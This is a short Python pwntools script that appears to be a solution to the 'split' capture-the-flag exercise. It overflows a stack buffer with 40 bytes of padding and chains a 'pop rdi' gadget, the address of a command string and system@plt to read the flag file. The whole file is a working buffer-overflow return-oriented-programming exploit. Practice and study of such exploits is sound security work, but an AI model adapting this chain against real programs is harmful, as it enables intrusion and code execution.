#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./split")
sh = process("./split")

system_plt = elf.plt["system"]
cat_flag = 0x00601060
pop_rdi = 0x00400883

payload = ""
payload += "A"*40
payload += p64(pop_rdi)
payload += p64(cat_flag)
payload += p64(system_plt)

sh.sendline(payload)
sh.interactive()